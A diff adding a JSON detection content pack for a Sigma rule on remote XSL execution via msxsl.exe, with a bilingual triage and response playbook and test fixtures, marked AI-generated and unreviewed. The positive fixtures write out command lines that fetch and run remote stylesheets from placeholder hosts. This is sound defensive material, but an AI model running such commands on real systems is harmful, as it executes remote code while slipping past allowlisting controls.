@@ -1,0 +1,125 @@
+{
+  "rule": {
+    "id": "75d0a94e-6252-448d-a7be-d953dff527bb",
+    "title": "Remote XSL Execution Via Msxsl.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Swachchhanda Shrawan Poudel",
+    "path": "windows/process_creation/proc_creation_win_msxsl_remote_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_msxsl_remote_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1220"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó msxsl.exe con \"http\" en la línea de comandos. Esto suele indicar que descargó una hoja de estilo XML o XSL desde una URL remota, y esa hoja puede ejecutar script incrustado.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\msxsl.exe y CommandLine contiene \"http\". Es el patrón típico del procesamiento remoto de XSL con la utilidad XSLT de línea de comandos de Microsoft (variante squiblytwo).",
+      "why_it_matters": "Un atacante puede usar msxsl.exe, un binario firmado por Microsoft, para cargar una hoja de estilo remota con JScript o VBScript. Así ejecuta código bajo un binario confiable y puede evadir controles de allowlisting (ATT&CK T1220, XSL Script Processing).",
+      "triage_steps": [
+        "Revise la CommandLine completa. Identifique las URL y los dominios remotos, y si tanto el argumento XML como el XSL son remotos.",
+        "Verifique la ruta y el hash de msxsl.exe. No viene instalado por defecto, así que determine cómo y cuándo llegó al equipo.",
+        "Analice ParentImage y su línea de comandos. Es sospechoso que provenga de Office, de hosts de scripts o de cmd o PowerShell lanzados desde un documento o correo.",
+        "Liste los procesos hijos de msxsl.exe (cmd, powershell, rundll32, regsvr32) y los archivos que escribió en +/- 15 minutos.",
+        "Busque las URL y los dominios en los logs de proxy, DNS y firewall. Evalúe su reputación y, si es posible, obtenga el XSL en un sandbox.",
+        "Pivote por el mismo usuario y equipo para encontrar alertas previas, inicios de sesión inusuales o persistencia creada en el mismo periodo.",
+        "Busque en todo el entorno otras ejecuciones de msxsl.exe o conexiones al mismo dominio."
+      ],
+      "false_positives": [
+        "Desarrolladores o pipelines de compilación que ejecutan transformaciones XSLT heredadas con hojas de estilo alojadas en servidores web internos.",
+        "Herramientas antiguas de reportes o documentación que invocan msxsl.exe con un namespace o una URL http como argumento."
+      ],
+      "response_steps": [
+        "Confirme si la actividad es maliciosa revisando el contenido del XSL y los procesos hijos. Consulte al usuario o al responsable de las herramientas de compilación.",
+        "Si es maliciosa, aísle el endpoint y bloquee el dominio o la URL remota en el proxy y el DNS.",
+        "Elimine los payloads descargados y cualquier persistencia. Elimine o bloquee msxsl.exe si no tiene uso de negocio, por ejemplo con WDAC o AppLocker.",
+        "Restablezca las credenciales del usuario afectado si se ejecutó código. Busque los mismos indicadores en otros equipos y restaure a un estado limpio si hace falta."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque msxsl.exe rara vez está presente y ejecutar hojas de estilo remotas es una técnica conocida para evadir el allowlisting, por lo que una coincidencia pocas veces es benigna."
+    },
+    "en": {
+      "summary": "msxsl.exe ran with \"http\" in its command line. This usually means it fetched an XML or XSL stylesheet from a remote URL, which can run embedded script.",
+      "what_it_detects": "Process creation events where Image ends with \\msxsl.exe and CommandLine contains \"http\". The pattern is typical of remote XSL script processing (squiblytwo-style) with the Microsoft command-line XSLT utility.",
+      "why_it_matters": "An attacker can use msxsl.exe, a signed Microsoft binary, to load a remote stylesheet with JScript or VBScript inside it. That runs code under a trusted binary and can slip past application allowlisting (ATT&CK T1220, XSL Script Processing).",
+      "triage_steps": [
+        "Read the full CommandLine. Note the remote URLs, the domains, and whether both the XML and the XSL arguments are remote.",
+        "Check where msxsl.exe lives and its hash. It is not a default install, so find out how it got onto the host and when.",
+        "Review ParentImage and its command line. Office apps, script hosts, cmd or PowerShell spawned from a document or email are suspicious.",
+        "List the child processes of msxsl.exe (cmd, powershell, rundll32, regsvr32) and any files it wrote within +/- 15 minutes.",
+        "Look up the URLs and domains in proxy, DNS and firewall logs. Check their reputation, and retrieve the XSL in a sandbox if you can.",
+        "Pivot on the same user and host for earlier alerts, unusual logons or persistence created around the same time.",
+        "Search the environment for other msxsl.exe executions or connections to the same domain."
+      ],
+      "false_positives": [
+        "Developers or build pipelines that run legacy XSLT transforms against stylesheets on internal web servers.",
+        "Old reporting or documentation tools that call msxsl.exe with an http namespace or URL argument."
+      ],
+      "response_steps": [
+        "Confirm the activity is malicious by reviewing the retrieved XSL content and the child processes. Check with the user or the owner of any build tooling.",
+        "If it is malicious, isolate the endpoint and block the remote domain or URL at the proxy and DNS.",
+        "Remove the dropped payloads and any persistence. Delete or block msxsl.exe if it has no business use, for example with WDAC or AppLocker.",
+        "Reset credentials for the affected user if code ran. Hunt for the same indicators on other hosts and restore from a clean state as needed."
+      ],
+      "severity_rationale": "High fits because msxsl.exe is rarely present and remote stylesheet execution is a known way to bypass allowlisting, so a match is seldom benign."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "msxsl.exe launched from cmd processes a remote XML and XSL pair hosted on an external domain.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Local\\Temp\\msxsl.exe",
+          "CommandLine": "msxsl.exe http://files.example.org/payload/data.xml http://files.example.org/payload/style.xsl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c msxsl.exe http://files.example.org/payload/data.xml http://files.example.org/payload/style.xsl"
+        }
+      },
+      {
+        "description": "msxsl.exe with a local XML file and a remote HTTPS stylesheet, spawned by PowerShell.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\ProgramData\\tools\\msxsl.exe",
+          "CommandLine": "\"C:\\ProgramData\\tools\\msxsl.exe\" C:\\ProgramData\\tools\\input.xml https://203.0.113.45/t.xsl",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate local XSLT transform with msxsl.exe that references no URL.",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Tools\\msxsl\\msxsl.exe",
+          "CommandLine": "C:\\Tools\\msxsl\\msxsl.exe C:\\build\\report.xml C:\\build\\report.xsl -o C:\\build\\report.html",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "A browser opening an http URL. The command line contains http but the image is not msxsl.exe.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+          "CommandLine": "\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\" http://intranet.example.com/style.xsl",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
